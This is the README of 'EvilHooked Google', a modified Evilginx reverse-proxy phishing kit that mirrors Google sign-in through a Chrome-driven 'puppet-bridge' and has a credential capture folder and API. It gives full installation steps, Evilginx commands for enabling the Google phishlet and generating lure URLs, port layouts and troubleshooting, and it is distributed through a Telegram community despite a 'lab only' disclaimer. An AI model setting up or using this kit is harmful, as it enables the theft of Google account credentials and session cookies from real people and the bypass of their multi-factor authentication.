# EvilHooked Google (lab kit)

Community: [https://t.me/EvilHooked](https://t.me/EvilHooked)  
Version: `4.3.0-beta.2`

Local Google mirror kit: Evilginx + Node puppet-bridge (CDP Chrome).

> **Lab / authorized use only.** Self-signed certs (`-developer`). Use a disposable lab domain (e.g. `google.fake.com`) and local DNS/hosts.

---

## Requirements

| | Windows | Linux |
|---|---|---|
| OS | Windows 10/11 | Ubuntu 22.04+ / Debian 12+ (recommended) |
| Runtime | [Node.js 18+](https://nodejs.org/) | Node.js 18+ |
| Browser | Google Chrome | Google Chrome / Chromium |
| Privileges | **Admin** (ports **53** / **443**) | **root** or `CAP_NET_BIND_SERVICE` (53/443) |
| Binary | `evilginx.exe` (shipped) | build with Go 1.21+ (see below) |

---

## Quick start — Windows

```powershell
# 1) Unpack the zip, open PowerShell in the kit root
cd path\to\EvilHooked-Google-light

# 2) Install bridge deps
cd puppet-bridge
npm install
cd ..

# 3) Start stack (Admin PowerShell)
.\.phishforge\start-evilginx.ps1
```

In the Evilginx console:

```text
config domain google.fake.com
phishlets hostname google google.fake.com
phishlets enable google
lures create google
lures get-url 0
```

Point lab DNS / `hosts` so `*.google.fake.com` resolves to `127.0.0.1`, open the lure URL, accept the self-signed cert warning.

Expected log lines:

```text
EvilHooked: https://t.me/EvilHooked
WEB modules: No module
bridge ok mode=mirror ...
```

Stop: close the Evilginx window, or kill `evilginx` / `node` processes.

---

## Quick start — Linux

### 1) System packages

```bash
sudo apt update
sudo apt install -y curl ca-certificates git build-essential

# Node.js 20 (example via NodeSource) — or use nvm / distro package ≥18
curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
sudo apt install -y nodejs

# Chrome or Chromium
# Option A — Google Chrome:
wget -q https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
sudo apt install -y ./google-chrome-stable_current_amd64.deb
# Option B — Chromium:
# sudo apt install -y chromium-browser
```

### 2) Unpack & npm

```bash
cd /opt   # or any path
unzip EvilHooked-Google-light-*.zip
cd EvilHooked-Google-light   # folder name may vary

cd puppet-bridge
npm install
npx playwright install chrome   # or: npx playwright install chromium
cd ..
```

### 3) Build Evilginx for Linux

The light zip ships `evilginx.exe` (Windows). On Linux build once:

```bash
# Install Go if missing: https://go.dev/dl/
cd .phishforge/evilginx
go build -o evilginx -mod=vendor .
chmod +x evilginx
cd ../..
```

If `vendor/` is missing from the pack, run `go mod vendor` before `go build` (needs network).

### 4) Start

```bash
chmod +x .phishforge/start-evilginx.sh .phishforge/start-puppet-chrome.sh
sudo ./.phishforge/start-evilginx.sh
```

Same Evilginx commands as on Windows (`config domain` … `lures get-url 0`).

---

## Manual start (any OS)

Useful if scripts fail.

```bash
# Terminal A — Chrome CDP
google-chrome \
  --remote-debugging-port=9222 \
  --user-data-dir="$(pwd)/.phishforge/chrome-profile-cdp" \
  --no-first-run --disable-default-apps \
  about:blank &

# Terminal B — puppet-bridge
export PHISHFORGE_ROOT="$(pwd)"
export PHISHFORGE_PUPPET_CONFIG="$(pwd)/.phishforge/puppet-google.json"
# edit puppet-google.json → absolute chromeProfileDir / captureDir if needed
cd puppet-bridge
node src/index.js "$PHISHFORGE_PUPPET_CONFIG"

# Terminal C — evilginx (root)
cd .phishforge/evilginx
sudo ./evilginx -p ./phishlets -c ../evilginx-config -developer
# Windows: evilginx.exe with the same flags
```

Health check:

```bash
curl -s http://127.0.0.1:1000/health
```

---

## Config files (local lab)

| Path | Purpose |
|------|---------|
| `.phishforge/puppet-google.json` | Bridge mode (`mirror`), port `1000`, CDP `9222`, lab domain |
| `.phishforge/evilginx-config/` | Evilginx runtime config / DB |
| `.phishforge/evilginx/phishlets/google.yaml` | Google phishlet |
| `modules/WEB/` | Panel modules folder (empty → `WEB modules: No module`) |

Start scripts rewrite `chromeProfileDir` / `captureDir` to absolute paths for the current machine and save **UTF-8 without BOM** (Node `JSON.parse` rejects BOM).

Do **not** open `puppet-google.json` in editors that re-save with BOM.

---

## Ports

| Port | Service |
|------|---------|
| 53 | Evilginx DNS (lab) |
| 443 | HTTPS (self-signed in developer mode) |
| 9222 | Chrome remote debugging (CDP) |
| 1000 | puppet-bridge |
| 9092 | Capture API (localhost) |

---

## Troubleshooting

| Symptom | Fix |
|---------|-----|
| `Unexpected token '' … is not valid JSON` | BOM in `puppet-google.json` — re-save UTF-8 **without BOM**, or re-run start script |
| `Evilpuppet mirror unavailable … :1000 refused` | Bridge not running → `npm install` + start script / check `curl :1000/health` |
| `WEB modules: No module` | Normal when `modules/WEB` is empty |
| Cert warning in browser | Expected with `-developer` — Advanced → Continue (lab only) |
| Port 53/443 busy | Stop other DNS/HTTPS listeners; run as Admin/root |
| Linux: missing `evilginx` binary | Build with Go (see above) |

---

## Layout

```text
.
├── README.md
├── modules/WEB/                 # optional panel modules
├── puppet-bridge/               # Node mirror sidecar
│   ├── package.json
│   ├── public/
│   └── src/
└── .phishforge/
    ├── puppet-google.json
    ├── start-evilginx.ps1       # Windows
    ├── start-evilginx.sh        # Linux
    ├── start-puppet-chrome.ps1
    ├── start-puppet-chrome.sh
    ├── evilginx/                # binary + phishlets
    ├── evilginx-config/
    ├── chrome-profile-cdp/
    └── captures/
```

---

## License / community

Modified Evilginx line: RProxy LAB xCommunity.  
Updates & discussion: [t.me/EvilHooked](https://t.me/EvilHooked)
